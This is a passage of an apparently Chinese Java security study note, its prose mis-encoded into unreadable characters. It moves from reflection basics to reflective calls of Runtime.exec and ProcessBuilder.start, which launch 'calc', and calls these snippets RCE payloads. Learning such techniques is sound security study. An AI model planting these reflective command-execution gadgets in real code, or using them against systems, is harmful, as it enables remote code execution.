æ­¤invokeæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰å¯ä»¥æ˜¯nullæˆ–ç±»å¯¹è±¡ï¼Œåå°„APIä¼šè‡ªåŠ¨å¤„ç†å¹¶å¿½ç•¥å®ƒã€‚æ³¨æ„ç†è§£ä¸Šé¢çš„æ ¼å¼ã€‚\nè·å–æ„é€ å‡½æ•°Constructor è·å–æ„é€ å‡½æ•°Constructorï¼Œä½äºjava.lang.reflect.Constructorsä¸­ï¼Œå¸¸ä½¿ç”¨çš„æ–¹æ³•æœ‰ï¼š\nConstructor[] getConstructors()ï¼šåªè¿”å›publicæ„é€ å‡½æ•° Constructor[] getDeclaredConstructors()ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•° Constructor getConstructor(Class\u0026hellip;)ï¼šåŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦åˆçš„publicæ„é€ å‡½æ•° Constructor getDeclaredConstructor(Class\u0026hellip;)ï¼šåŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•° Reflection.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; public class Reflection { private String name; public int age; public Reflection(){ System.out.println(\u0026#34;è°ƒç”¨æ— å‚æ„é€ å‡½æ•°\u0026#34;); } public Reflection(String name){ System.out.println(\u0026#34;è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°\u0026#34;+name); } private Reflection(int age){ this.age=age; System.out.println(\u0026#34;è°ƒç”¨ç§æœ‰æ„é€ å‡½æ•°\u0026#34;+age); } public int getAge(){ return this.age; } } Main.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Constructor[] constructor = clazz.getDeclaredConstructors(); for(Constructor x:constructor){ System.out.println(x); } System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(String.class); System.out.println(constructor1); //ç®€å•åˆ©ç”¨ï¼Œå®ä¾‹åŒ–å¯¹è±¡ï¼š constructor1.newInstance(\u0026#34;fupanc\u0026#34;); System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor2 = clazz.getDeclaredConstructor(int.class); System.out.println(constructor2); constructor2.setAccessible(true); Reflection o = (Reflection)constructor2.newInstance(12345); System.out.println(o.getAge()); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 private java_foundation.Reflection(int) public java_foundation.Reflection(java.lang.String) public java_foundation.Reflection() =============== public java_foundation.Reflection(java.lang.String) è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°fupanc =============== private java_foundation.Reflection(int) è°ƒç”¨ç§æœ‰æ„é€ å‡½æ•°12345 12345 è°ƒç”¨privateä¿®é¥°çš„Constructoræ—¶ï¼Œå¿…é¡»é¦–å…ˆé€šè¿‡setAccessible(true)è®¾ç½®å…è®¸è®¿é—®ã€‚\nè·å–ç»§æ‰¿å…³ç³» è·å–çˆ¶ç±»\n1 Class.getSuperclass() è·å–interface\n1 Class.getInterface() åå°„åˆ›å»ºç±»å¯¹è±¡ å…¶å®è¿™ä¸ªå·²ç»åœ¨å‰é¢ä»£ç çš„ç¤ºä¾‹ä¸­å·²ç»åˆ©ç”¨è¿‡æ»¤ï¼Œåªè¦æŠŠå‰é¢ä»£ç çœ‹æ‡‚è¿™ä¸ªæ¿å—å°±æ²¡æœ‰é—®é¢˜ã€‚ç›´æ¥ç»™ä»£ç ï¼š\n1 2 Class ctf = Class.forName(\u0026#34;Main\u0026#34;); // åˆ›å»ºClasså¯¹è±¡ Main o = (Main)ctf.newInstance(); // åˆ›å»ºç±»å¯¹è±¡ åˆ™oå°±æ˜¯å¯¹åº”çš„ç±»å¯¹è±¡ã€‚\nè¿™é‡Œè°ƒç”¨çš„è¿™ä¸ªç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œä½†æ˜¯ä¸ä¸€å®šå¯ä»¥ä½¿ç”¨æˆåŠŸï¼ŒåŸå› å¯èƒ½ä¸ºï¼š\nä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ æ³¨æ„å¦‚æœæ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨Constructor.newInstance()æ¥å®ä¾‹åŒ–ä¸€ä¸ªç±»å¯¹è±¡ã€‚å¦‚ä¸‹ï¼š\n1 2 3 4 5 //public Main(String name)ä½œä¸ºæ„é€ å‡½æ•°ï¼š Class clazz = Class.forName(\u0026#34;Main\u0026#34;); clazz.getMethod(\u0026#34;setName\u0026#34;,String.class).invoke(clazz.getConstructor(String.class).newInstance(\u0026#34;admin\u0026#34;),\u0026#34;haha\u0026#34;); //å½“æ²¡æœ‰æƒé™è®¿é—®æ—¶å¯ä»¥è°ƒç”¨constructor.setAccessible(true)æ¥åˆ›å»ºå‡ºç±»å®ä¾‹ åˆ©ç”¨åå°„è¿›è¡Œå‘½ä»¤æ‰§è¡Œ åˆ©ç”¨Runtimeç±» java.lang.Runtime ä¸­æœ‰ä¸€ä¸ªexecæ–¹æ³•å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤ï¼Œä½†æ˜¯ä¸èƒ½å¦‚ä¸‹ç›´æ¥æ„é€ æ¥æ‰§è¡Œå‘½ä»¤ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.reflect.*; public class Text { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method method1 = ctf.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(ctf.newInstance(),\u0026#34;id\u0026#34;); } } //ä¸­é—´ä»£ç å¯ä»¥ç®€åŒ–å¦‚ä¸‹ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¼åŒ…ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼š Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); ctf.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(ctf.newInstance(), \u0026#34;id\u0026#34;); è¿™æ ·ä¼šæŠ¥é”™\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: class Text cannot access a member of class java.lang.Runtime (in module java.base) with modifiers \u0026#34;private\u0026#34; at java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:361) at java.base/jdk.internal.reflect.Reflection.ensureMemberAccess(Reflection.java:99) at java.base/java.lang.Class.newInstance(Class.java:579) at Text.main(Text.java:5) åŸå› å°±æ˜¯Runtimeç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œå¯¼è‡´è¿™æ ·ctf.newInstance()ç›´æ¥è°ƒç”¨æ˜¯é”™è¯¯çš„ã€‚\nå¯ä»¥çœ‹ä¸€ä¸‹æºç \nå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªgetRuntime()æ–¹æ³•å¯ä»¥è·å–åˆ°å¯¹è±¡ï¼Œè¿™ç§è®¾è®¡å°±æ˜¯â€œå•ä¾‹æ¨¡å¼â€ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªé™æ€æ–¹æ³•æ¥è·å–å¯¹è±¡ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬åªèƒ½é€šè¿‡Runtime.getRuntime()æ¥è·å–åˆ°Runtimeå¯¹è±¡ã€‚\nè¿™é‡ŒRuntime.getRuntime()æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨invokeæ‰§è¡Œæ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¼ å…¥ä¸€ä¸ªRuntimeç±»,æ‰€ä»¥å¯ä»¥å°†ä»£ç æ”¹æˆå¦‚ä¸‹æ¥æ‰§è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Runtime.class; clazz.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class).invoke(clazz.getDeclaredMethod(\u0026#34;getRuntime\u0026#34;).invoke(null),\u0026#34;calc\u0026#34;); } } //æˆåŠŸå¼¹å‡ºè®¡ç®—æœº è¿˜å¯ä»¥é€šè¿‡setAccessible(true)è·å¾—è®¿é—®æƒé™ï¼Œå…¨åå°„è°ƒç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor constructor1 = ctf.getDeclaredConstructor(); constructor1.setAccessible(true); Object o = constructor1.newInstance(); Method method1 = ctf.getMethod(\u0026#34;getRuntime\u0026#34;); Object x = method1.invoke(o); Method method2 = ctf.getMethod(\u0026#34;exec\u0026#34;,String.class); method2.invoke(x,\u0026#34;calc\u0026#34;); } } æœ€åè™½ç„¶å¼¹å‡ºè­¦å‘Šä½†æ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœº\n1 2 3 4 5 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by Text (file:/D:/java_text/java-1/out/production/java-1/) to constructor java.lang.Runtime() WARNING: Please consider reporting this to the maintainers of Text WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release å…¶å®ç›´æ¥å¦‚ä¸‹åˆ©ç”¨å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Runtime rt = (Runtime)constructor.newInstance(); rt.exec(\u0026#34;calc\u0026#34;); } } ä½†æ˜¯ä¸Šé¢çš„å…¨åˆ©ç”¨åå°„æ¥åˆ©ç”¨è¿˜æ˜¯éœ€è¦å­¦ä¹ ä¸€ä¸‹ã€‚\nå…¶ä»–ç±»ä¸æ–¹æ³•åˆ©ç”¨ ç°åœ¨ç›´æ¥ä½¿ç”¨Runtime.getRuntime().exec(cmd)çš„è°ƒç”¨å…¶å®å·²ç»ä¸å¤ªå¥½æ‰¾äº†ï¼Œåœ¨è¿™é‡Œçœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œä¹Ÿæ˜¯æ‹“å±•äº†æˆ‘çš„æ€è·¯ï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡è·Ÿè¿›Runtiemç±»çš„exec()æ–¹æ³•çš„åº•å±‚è°ƒç”¨è¿‡ç¨‹æ¥å®ŒæˆRCEåŠŸèƒ½çš„å®ç°ã€‚\nç°åœ¨è¿˜æ˜¯æ¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™é‡Œçš„åº•å±‚å®ç°ä»¥åŠè‡ªå·±æ„å»ºä»£ç ã€‚\nåŸºæœ¬æµ‹è¯•ç±»ï¼š\nMain.javaï¼š\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Runtime rt = Runtime.getRuntime(); rt.exec(\u0026#34;calc\u0026#34;); } } è¿è¡ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nè°ƒè¯•è¿‡ç¨‹ è·Ÿè¿›ä»£ç ä¸­çš„exec()æ–¹æ³•ï¼Œç„¶åæ‰“æ–­ç‚¹ï¼š\nå¼€å§‹è°ƒè¯•ï¼š\nç„¶åè°ƒç”¨äº†é‡è½½çš„exec()æ–¹æ³•ï¼š\nåˆè°ƒç”¨äº†é‡è½½çš„exec()æ–¹æ³•ï¼š\nç„¶åè¿™é‡Œå°±å®ä¾‹åŒ–äº†ä¸€ä¸ªæ–¹æ³•æ¥æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ã€‚åœ¨è¿™é‡Œæˆ‘è°ƒè¯•æ—¶å‘ç°å…¶å®è¿™é‡Œç›´æ¥returnè¿™ä¸ªProcessBuilderç±»åç›´æ¥å°±å¼¹å‡ºäº†è®¡ç®—æœºï¼Œè¯´æ˜å…¶å®è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ã€‚æ‰€ä»¥è¿™é‡Œå°±æœ‰ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œç›´æ¥æ ¹æ®è¿™é‡Œçš„ç‚¹æ¥æ„é€ ä¸€ä¸ªç®€å•çš„payloadï¼Œç¬¬ä¸€æ„é€ ç‚¹äº†ï¼Œä½†æ˜¯åé¢å†è¯´æ˜ã€‚è¿™é‡Œç»§ç»­è·Ÿä»£ç ï¼š\nç„¶åå°±æ˜¯å®ä¾‹åŒ–äº†ProcessBuilderç±»ï¼š\nå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªcommandæ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹çš„å€¼ï¼Œå¹¶ä¸”è¿™é‡Œaddè¿‡åçš„å€¼ä¹Ÿå¯ä»¥è°ƒè¯•çœ‹ä¸€ä¸‹ï¼š\nã€‚ç»§ç»­å¾€åé¢èµ°ï¼Œè°ƒç”¨äº†environment()æ–¹æ³•ï¼š\nè¿™é‡Œå…¶å®å°±æ˜¯ç›´æ¥è¿”å›çš„å‰é¢çš„ProcessBuilderç±»å®ä¾‹ï¼Œæ²¡æœ‰å…¶ä»–æ“ä½œã€‚\nç„¶åè°ƒç”¨äº†directory()æ–¹æ³•ï¼š\nä¸€ä¸ªç®€å•çš„èµ‹å€¼æ“ä½œï¼Œç„¶åè¿”å›äº†ProcessBuilderç±»å®ä¾‹ã€‚\næœ€åè°ƒç”¨äº†start()æ–¹æ³•ï¼š\nä»£ç é€»è¾‘ç®€å•è·Ÿä¸€ä¸‹ï¼Œè¿˜æ˜¯èƒ½çœ‹æ‡‚ï¼Œä¸»è¦è°ƒç”¨çš„å°±æ˜¯ä¸‹é¢çš„ProcessImplç±»çš„start()æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œåœ¨æ‰§è¡Œè¿™ä¸ªæ–¹æ³•åå¼¹å‡ºè®¡ç®—æœºï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯ç¬¬äºŒä¸ªæ„é€ ç‚¹ã€‚ç°åœ¨è¿˜æ˜¯ä¸è°ˆï¼Œåé¢å†å…·ä½“åˆ†æã€‚\nåœ¨è¿™é‡Œå°±æ˜¯è°ƒç”¨äº†ProcessImplç±»çš„start()æ–¹æ³•ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹ProcessImplç±»çš„start()æ–¹æ³•çš„å®šä¹‰ï¼š\nå°±æ˜¯è¿™ä¸ªstaticä¿®é¥°ç¬¦ï¼Œè®©è¿™ä¸ªstart()æ–¹æ³•å¯ä»¥ç›´æ¥è¢«è°ƒç”¨ã€‚é‚£ä¹ˆç°åœ¨å†ç»§ç»­è·Ÿè¿›è¿™é‡Œçš„start()æ–¹æ³•ï¼Œå‚æ•°ä¼ é€’æƒ…å†µï¼š\nç®€å•è·Ÿäº†ä¸€ä¸‹ï¼Œå…¶å®æœ€åè°ƒç”¨çš„è¿˜æ˜¯å¦‚ä¸‹ä»£ç ï¼š\nè°ƒè¯•è¿‡åå‘ç°è¿™é‡Œä¹Ÿæ˜¯ç›´æ¥å®ä¾‹åŒ–è¿™ä¸ªè¿‡ç¨‹ç„¶åå¼¹å‡ºè®¡ç®—æœºï¼Œè¿™é‡Œçš„å‚æ•°ä¼ é€’ï¼š\næ‰€ä»¥è¿™é‡Œåˆæ˜¯ç¬¬ä¸‰æ„é€ æ–¹æ³•ã€‚ï¼ˆæ„Ÿè§‰å…¶å®è¿™é‡Œéƒ½æ˜¯ä¸€å±‚å¥—ä¸€å±‚ï¼Œä¸»è¦æ˜¯å‚æ•°çš„ä¼ é€’å§ï¼‰ã€‚\nå†ç»§ç»­è·Ÿè¿›ï¼Œç°åœ¨æ¥åˆ°äº†ProcessImplç±»çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š\næ‰€ä»¥ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œå°±æ˜¯å°†allowAmbiguousCommandsè®¾ç½®ä¸ºtrueï¼Œä»¥åŠvalueæœ€ç»ˆå€¼ä¸ºnullï¼Œç„¶åå°±é€€å‡ºç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œéšåæ­£å¥½å°±è¿›å…¥äº†ç¬¬äºŒä¸ªifæ¡ä»¶ï¼Œè¿™é‡Œå°±ä¸ç»†è·Ÿç¬¬äºŒä¸ªifæ¡ä»¶äº†ï¼Œæœ€åé€€å‡ºè¿™ä¸ªifæ¡ä»¶ï¼Œå°†è°ƒç”¨create()æ–¹æ³•ï¼š\nå½“è·³è¿‡è¿™ä¸ªcreate()æ–¹æ³•å°±å¼¹å‡ºè®¡ç®—æœºï¼Œè¯´æ˜è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œç¬¬å››æ„é€ ç‚¹ã€‚é‚£ä¹ˆç°åœ¨ç»§ç»­è·Ÿè¿›è¿™ä¸ªcreate()æ–¹æ³•ï¼Œä½†æ˜¯ä¸€ç›´è·Ÿä¸è¿›å»ï¼Œalt+shift+F7å¼ºåˆ¶æ­¥å…¥ä¹Ÿè¿›ä¸äº†ã€‚ç®€å•è·Ÿè¿›æ˜¯å¯¹åº”çš„å¦‚ä¸‹æ–¹æ³•ï¼š\nä¸Šé¢ä¹Ÿæ˜¯æœ‰æ–¹æ³•è¯´æ˜çš„ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ä¼šä½¿ç”¨win32å‡½æ•°æ¥åˆ›å»ºè¿›ç¨‹ï¼Œè¿™é‡Œå°±æœ‰ç‚¹å¤ªåº•å±‚äº†ã€‚å¹¶ç”±ç”±äºæ“ä½œç³»ç»Ÿçš„ä¸åŒï¼Œè¿™åˆ†æå‡ºæ¥çš„ä¸»è¦æ˜¯windowsç³»ç»Ÿä¸‹ï¼Œå¯¹äºlinuxç³»ç»Ÿä¸‹çš„åˆ©ç”¨ä¹Ÿå°±ä¼šæœ‰ä¸åŒï¼Œä¸å†å¾€ä¸‹è·Ÿäº†ã€‚\næ€»ç»“ä¸€ä¸‹å‰é¢çš„å‡ ä¸ªæ„é€ ç‚¹ï¼š\nnew ProcessBuilder(cmdarray).environment(envp).directory(dir).start() ProcessImplç±»çš„start()æ–¹æ³•ã€‚ å¤§æ¦‚å°±æ˜¯è¿™ä¸¤ä¸ªï¼Œå› ä¸ºlinuxå’Œwindowsä¸¤ä¸ªæ“ä½œç³»ç»Ÿçš„ä¸åŒï¼Œåœ¨ç¬¬ä¸‰ä¸ªæ„é€ ç‚¹å°±å¼€å§‹æœ‰ä¸åŒä»£ç äº†ï¼Œå¦‚æœæ˜¯æ‰“linuxç¯å¢ƒä¹Ÿè®¸è¿˜æœ‰æ›´å¤šçš„paylaodï¼Œè¿™ä¸ªå°±åˆ°æ—¶å€™å†å…·ä½“è·Ÿå§ã€‚è¿™é‡Œå°±åªè¯´æ˜è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå…·ä½“åŒºåˆ«å¯ä»¥çœ‹ä¸€ä¸‹å‚è€ƒæ–‡ç« ã€‚\nåˆ©ç”¨ProcessBuilder å¯¹åº”ä»£ç ï¼š\njava.lang.ProcessBuilderç±»ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œ è¿˜æ˜¯è°ƒè¯•ä»£ç çœ‹éœ€è¦å“ªäº›å‚æ•°ï¼š\né¦–å…ˆå°±æ˜¯æ–°å»ºäº†ProcessBuilderç±»å®ä¾‹ï¼Œé‡ç‚¹æ˜¯æ³¨æ„å‚æ•°ç±»å‹ä»¥åŠå‚æ•°çš„ä¼ é€’ï¼Œå…ˆæ˜¯å®ä¾‹åŒ–äº†ProcessBuilderç±»ï¼š\nç„¶åå°†è¿™ä¸ªcommandå˜é‡è®¾ç½®ä¸ºäº†ä¸€ä¸ªæ•°ç»„ç±»å‹çš„å˜é‡ã€‚\nç„¶åè°ƒç”¨äº†environment()æ–¹æ³•ï¼Œä½†æ˜¯æ²¡å•¥ç”¨ï¼Œå…¶å®å°±æ˜¯å°†ProcessBuilderç±»çš„environmentå˜é‡è®¾ç½®ä¸ºnullã€‚\nç„¶åè°ƒç”¨äº†directory()æ–¹æ³•ï¼ŒåŒæ ·å…¶å®å°±æ˜¯ä¸€ä¸ªå°†ProcessBuilderç±»çš„directoryå˜é‡è®¾ç½®ä¸ºnullã€‚\næœ€åè°ƒç”¨äº†start()æ–¹æ³•å®Œæˆå‘½ä»¤çš„æ‰§è¡Œã€‚\nä½†æ˜¯å…¶å®å¯¹äºä¸­é—´ä¸¤ä¸ªå˜é‡çš„è®¾ç½®ï¼Œå…¶å®åœ¨ProcessBuilderç±»åˆå§‹åŒ–åå°±å·²ç»ç¬¦åˆæ¡ä»¶äº†ï¼š\næ‰€ä»¥å…¶å®åªç”¨è·å–æ„é€ å™¨å’Œstart()æ–¹æ³•å³å¯ã€‚ä½†è¿™é‡Œè¦è¯´æ˜ä¸€ä¸ªç‚¹ï¼šJavaä¸­çš„å¯å˜é•¿å‚æ•°ï¼Œå½“å®šä¹‰å‡½æ•°çš„æ—¶å€™ä¸ç¡®å®šå‚æ•°æ•°é‡çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨...è¿™æ ·çš„è¯­æ³•æ¥è¡¨ç¤ºâ€è¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°æ˜¯å¯å˜çš„â€œã€‚åŒæ—¶å¯¹äºå¯å˜é•¿å‚æ•°ï¼ŒJavaåœ¨ç¼–è¯‘æ—¶ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œæ‰€æœ‰è¯´ä¸‹é¢è¿™ä¸¤ç§å†™æ³•åœ¨åº•å±‚å…¶å®æ˜¯ç­‰ä»·çš„ï¼š\n1 2 public void hello(String[] names){} public void hello(String...name){} å¯¹äºåå°„æ¥è¯´ï¼Œå¦‚æœè¦è·å–çš„ç›®æ ‡å‡½æ•°é‡ŒåŒ…å«å¯å˜é•¿å‚æ•°ï¼Œå…¶å®æˆ‘ä»¬è®¤ä¸ºå®ƒæ˜¯æ•°ç»„å°±è¡Œäº†ã€‚\né‚£ä¹ˆå¯ä»¥å¦‚ä¸‹æ„é€ paylaodï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance(cmd)); } } ä½†æ˜¯æŠ¥é”™ï¼š\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException: argument type mismatch at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:422) at java_foundation.MyTest.main(MyTest.java:13) ä¹Ÿç®—ç§¯ç´¯ç»éªŒäº†ï¼Œä¸€ç›´åœ¨çœ‹è¯­æ³•ï¼Œç»“æœé—®æŠ¥é”™ä¸€ä¸‹å°±è§£å†³äº†ï¼Œè¿™é‡Œçš„åŸºæœ¬çš„å¤§éƒ¨åˆ†è¯­æ³•æ˜¯æ²¡æœ‰é”™è¯¯çš„ï¼Œä¸»è¦è¿˜æ˜¯å¯å˜å‚æ•°çš„åŸå› ã€‚å³ProcessBuilderç±»çš„æ„é€ å‡½æ•°ï¼š\nè¿™é‡Œå°±ç›´æ¥ç»§æ‰¿ä¸€ä¸ªå›ºå®šçš„å§ï¼Œä¹Ÿå°±æ˜¯è¯´ã€‚æˆ‘åœ¨åå°„æ—¶è·å–äº†æ­£ç¡®çš„æ„é€ å‡½æ•°String[].classï¼Œä½†æ˜¯åœ¨å®ä¾‹åŒ–æ—¶æœ‰åŒºåˆ«ï¼Œä¸»è¦æ˜¯å› ä¸º å¯å˜å‚æ•° (varargs) å’Œ æ•°ç»„ç±»å‹ åœ¨ Java åå°„ä¸­çš„å¤„ç†æ–¹å¼ç¨å¾®ä¸åŒã€‚å°±æ˜¯åœ¨è°ƒç”¨newInstance()æ–¹æ³•æ—¶ï¼ŒJavaä¼šå°†å¯å˜å‚æ•°è§†ä¸ºä¸€ä¸ªObject[]ç±»å‹ï¼Œè€Œä¸æ˜¯ç›´æ¥çš„String[]ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºObjectç±»å‹ã€‚æ‰€ä»¥æ­£ç¡®çš„åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //åŸåˆ©ç”¨æ€è·¯ï¼šnew ProcessBuilder(new String[]{\u0026#34;calc\u0026#34;}).start(); package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance((Object)cmd)); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œå¹¶ä¸”åªä½¿ç”¨åå°„çš„æ¡ä»¶ã€‚è¿˜å¯ä»¥å¦‚ä¸‹è¿›è¡Œè¯´æ˜ä¼ å‚ï¼š\næˆ‘ä»¬å°†å­—ç¬¦ä¸²æ•°ç»„çš„ç±»String[].classä¼ ç»™getConstructorå³å¯ï¼Œæ­¤æ—¶å°±è·å–åˆ°äº†å‚æ•°ä¸ºæ•°ç»„ç±»å‹çš„newInstance()ï¼Œåœ¨è°ƒç”¨newInstanceçš„æ—¶å€™ï¼Œå› ä¸ºæœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ˆå³ä¸€ä¸ªæ•°ç»„ï¼‰ï¼Œå¹¶ä¸”éœ€è¦æˆ‘ä»¬ä¼ ç»™ ProcessBuilderæ„é€ å™¨çš„å‚æ•°çš„æ˜¯ä¸€ä¸ªList\u0026lt;String\u0026gt;ç±»å‹ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„,æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(String[].class); Object o = constructor1.newInstance(new String[][]{{\u0026#34;calc\u0026#34;}}); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*ä¸­é—´ä»£ç ç²¾ç®€ï¼š Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc\u0026#34;}})); è¯´ä¸€ç‚¹ç‚¹ä»£ç ï¼š\nå¯¹äºnew String[][]{{\u0026quot;calc\u0026quot;}}ï¼šè¿™é‡Œä½¿ç”¨ new å…³é”®å­—åˆ›å»ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªäºŒç»´å­—ç¬¦ä¸²æ•°ç»„ï¼Œç¡®ä¿å‚æ•°ç±»å‹æ­£ç¡®åŒ¹é… ã€‚ ç„¶ååœ¨å…¶ä»–æ–‡ç« ä¸­çœ‹åˆ°äº†å¦å¤–ä¸€ä¸ªæœ‰æ„æ€çš„paylaodï¼Œç›´æ¥çœ‹å§ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.List; import java.util.Arrays; public class MyTest { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(List.class); Object o = constructor1.newInstance(Arrays.asList(\u0026#34;calc\u0026#34;)); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*æˆåŠŸå¼¹è®¡ç®—æœº 